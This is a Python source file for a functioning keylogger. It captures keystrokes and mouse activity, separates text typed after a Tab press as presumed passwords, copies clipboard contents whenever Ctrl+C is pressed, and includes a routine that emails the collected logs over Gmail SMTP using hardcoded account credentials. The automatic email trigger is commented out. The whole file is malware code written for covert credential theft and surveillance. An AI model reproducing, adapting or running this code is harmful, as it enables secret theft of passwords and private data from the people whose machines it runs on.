import ctypes
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from email.header import Header

import clipboard
from pynput import keyboard
from pynput import mouse
import os
from pynput.keyboard import Key

tab_key = False
Arr_mouse = []  # an arr to hold the mouse inputs
Arr_key = []  # an arr to hold the mouse inputs
count_M_move = 0  # made so that the log file won't be filed with mouse positions
Arr_Password = []

# the data in this section is a burnout. you can change it or enter the email for testing
#####################################
gmail_pass = "Keylogger9000"
user = "burnkeylogger9000@gmail.com"
######################################
host = "smtp.gmail.com"
port = 465


def on_move(x, y):  # tracks the movement of the mouse
    global count_M_move, Arr_mouse
    count_M_move += 1
    if count_M_move == 1000:  # ones every 1000 mouse movements
        count_M_move = 0
        Arr_mouse.append(str([x, y]))
        Arr_mouse.insert(0, '\nMouse is at position: ')
        Arr_mouse.append('\n')
        write_to_Log_file(Arr_mouse)
        Arr_mouse = []


def on_click(x, y, button, pressed):  # tracks the clicks of the mouse
    global Arr_mouse
    Arr_mouse.append(str([x, y]))
    Arr_mouse.insert(0, '\nMouse click at position: ')
    Arr_mouse.append('\n')
    write_to_Log_file(Arr_mouse)
    Arr_mouse = []


def on_press(key):  # tracks the key press of the keyboard
    global Arr_key, tab_key
    if key == Key.tab:
        if not tab_key:
            tab_key = True
        else:
            tab_key = False
    if tab_key:
        Arr_key.append(key)
        write_to_Passwords_file(Arr_key)
        Arr_key = []
    else:
        Arr_key.append(key)
        write_to_Log_file(Arr_key)
        Arr_key = []


def on_release(key):  # tracks the key release of the keyboard
    if key == Key.esc:
        # os.remove("Log.txt")
        # os.remove("Passwords.txt")
        return False


def get_capslock_state():
    hllDll = ctypes.WinDLL("User32.dll")
    VK_CAPITAL = 0x14
    return hllDll.GetKeyState(VK_CAPITAL)


def write_to_Log_file(keys):
    with open("Log.txt", 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")  # changing the input from 'z' --> z
            if k.find("space") > 0:
                f.write(' ')
            elif k.find("x03") > 0:  # if the user did a ctrl+c
                text = clipboard.paste()
                write_to_Passwords_file_ctrl(text)
                f.write('\n')
            elif k.find("Key") == -1:
                if get_capslock_state():
                    f.write(k.upper())
                else:
                    f.write(k)
        f.close()
    # count = count_rows("Log.txt")
    # if count > 50:  # ones the log file is 50 rows long an email will be sent
    #     send_email_w_attachment("burnkeylogger9000@gmail.com", "burnkeylogger9000@gmail.com",
    #                             "Have a nice Day", "Log.txt")
    #     f.close()
    #     os.remove("Log.txt")  # after the sending the file will be deleted


def write_to_Passwords_file(keys):
    with open("Passwords.txt", 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("enter") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                if get_capslock_state():
                    f.write(k.upper())
                else:
                    f.write(k)
    f.close()


def write_to_Passwords_file_ctrl(text):
    with open("Passwords.txt", 'a') as f:
        f.write(text + '\n')
    f.close()


def count_rows(file):  # counting the amount or rows in the text file
    with open(file) as f:
        count = sum(1 for _ in f)
        return count


def send_email_w_attachment(to, subject, body, filename):
    # create message object
    message = MIMEMultipart()

    # add in header
    message['From'] = Header(user)
    message['To'] = Header(to)
    message['Subject'] = Header(subject)

    # attach message body as MIMEText
    message.attach(MIMEText(body, 'plain', 'utf-8'))
    # locate and attach desired attachments
    att_name = os.path.basename(filename)
    _f = open(filename, 'rb')
    att = MIMEApplication(_f.read(), _subtype="txt")
    _f.close()
    att.add_header('Content-Disposition', 'attachment', filename=att_name)
    message.attach(att)

    # setup email server
    server = smtplib.SMTP_SSL(host, port)
    server.login(user, gmail_pass)

    # send email and quit server
    server.sendmail(user, to, message.as_string())
    server.quit()


with mouse.Listener(on_move=on_move, on_click=on_click) as listener:
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
